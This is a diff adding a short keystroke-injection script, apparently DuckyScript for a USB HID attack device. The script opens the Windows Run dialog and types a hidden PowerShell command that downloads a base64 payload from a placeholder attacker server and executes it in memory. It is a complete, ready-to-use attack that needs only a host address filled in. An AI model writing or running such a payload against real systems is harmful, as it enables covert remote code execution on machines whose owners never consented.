@@ -1,0 +1,5 @@
+REM Replace HOSTPORT with your server (e.g. 192.168.1.100:8443). If server has sync_token, use /sync?k=TOKEN instead of /sync.
+GUI r
+DELAY 500
+STRING powershell -nop -w hidden -c "$b=(New-Object Net.WebClient).DownloadString('https://HOSTPORT/sync');iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
+ENTER
